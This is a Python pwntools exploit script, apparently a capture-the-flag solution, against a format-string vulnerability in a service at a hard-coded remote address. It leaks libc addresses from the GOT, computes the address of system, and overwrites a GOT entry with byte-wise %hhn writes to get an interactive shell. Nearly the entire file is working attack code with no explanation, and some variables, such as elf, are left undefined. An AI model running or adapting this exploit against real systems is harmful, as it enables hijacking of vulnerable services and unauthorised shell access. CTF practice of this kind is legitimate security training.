from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = ""
LIBC = ""
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

conn = ''
def fn_leak(addr):
    global conn
    conn.sendline("%7$sAAA\x00" + p64(addr))
    data = conn.recvuntil("AAA")[:-3]
    #log.info("%#x => %s" % (addr, data.encode('hex')))
    return data

def exploit(conn, elf, libc, local):
    """
    caddr = 0x400000
    e = ""
    while caddr < 0x402000:
        r = fn_leak(conn, caddr)
        e += r + "\x00"
        caddr += len(r) + 1
    with open('./binary', 'wb') as f:
        f.write(e)
    """
    #d = DynELF(fn_leak, 0x400000)
    #d.lookup('system')
    #d.lookup('printf', 'libc')
    setbuf = u64(fn_leak(0x601018).ljust(8, "\x00"))
    log.info("%#x", setbuf)

    printf = u64(("\x00" + fn_leak(0x601021)).ljust(8, "\x00"))
    log.info("%#x", printf)

    gets = u64(fn_leak(0x601028).ljust(8, "\x00"))
    log.info("%#x", gets)

    """
    system = 0x045390
    printf = 0x055800
    """

    system = printf - 0x055800 + 0x045390

    towrite = []
    towrite.append((system & 0xff, 0x601020))
    towrite.append(((system >> 8) & 0xff, 0x601021))
    towrite.append(((system >> 16) & 0xff, 0x601022))
    towrite.sort()
    payload = ""
    payload += "%" + str(towrite[0][0]) + "c" # 4
    payload += "%11$hhn" # 7
    if towrite[1][0] != towrite[0][0]:
        payload += "%" + str(towrite[1][0]-towrite[0][0]) + "c"
    payload += "%12$hhn"
    if towrite[2][0] != towrite[1][0]:
        payload += "%" + str(towrite[2][0]-towrite[1][0]) + "c"
    payload += "%13$hhn"
    payload = payload.ljust(40, "A")
    payload += p64(towrite[0][1])
    payload += p64(towrite[1][1])
    payload += p64(towrite[2][1])
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == "__main__":
    #elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("47.75.182.113", 9999)
            r = remote(H, P)
            conn = r
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        #libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
